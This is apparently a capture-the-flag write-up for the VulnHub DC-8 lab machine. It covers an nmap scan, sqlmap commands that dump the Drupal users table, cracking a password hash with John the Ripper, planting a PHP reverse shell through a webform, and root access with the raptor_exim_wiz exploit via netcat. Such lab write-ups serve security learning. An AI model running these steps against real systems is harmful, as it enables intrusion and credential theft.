<h1>DC-8 Write-up</h1>

<h2>NMAP</h2>

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
80/tcp open  http    Apache httpd
```
<h3>PORT 80</h3>

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-8/images/URL.png)

From the details Section :

http://192.168.56.53/?nid=2

<h3>Sql Injection</h3>

**Sqlmap :**

```
sqlmap --url "http://192.168.56.53/?nid=2" --dbs
sqlmap --url "http://192.168.56.53/?nid=2" -D d7db
sqlmap --url "http://192.168.56.53/?nid=2" -D d7db -T users --dump
```
![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-8/images/sqlmap.png)

Found 2 users and the hashes of there passwords :
I am unable to crack the hash of admin user

but it took 5 sec to crack the hash of john ;) 


* john hashfile --wordlist=rockyou.txt

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-8/images/johncrack.png)

```
HASH : $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
Username : john 
Cracked HASH  : turtle
```

<h2>Droopal to Shell</h2>

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-8/images/step1shell.png)

**Click On "Webform"**

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-8/images/shellstep2.png)

**Click on "Form Settings"**

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-8/images/shellstep3.png)

**TYPE SOMETHING IN FIRST LINE THEN PASTE YOUR PHP SHELL CODE THEN SELECT TEXT FORMAT AS PHP n SAVE**

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-8/images/shellstep4.png)

**Start Listner and Submit all field**

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-8/images/wwwdatashell.png)


<h2>Privilege Escalation :</h2>

**SUID exploit**

Exploit : https://github.com/0xdea/exploits/blob/master/linux/raptor_exim_wiz

Steps :

1 ) send exploit to DC-8 Box :

2 ) chmod 777 raptor_exim_wiz

3 ) ./raptor_exim_wiz -m netcat 


![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-8/images/rootflag%20and%20privesc.png)

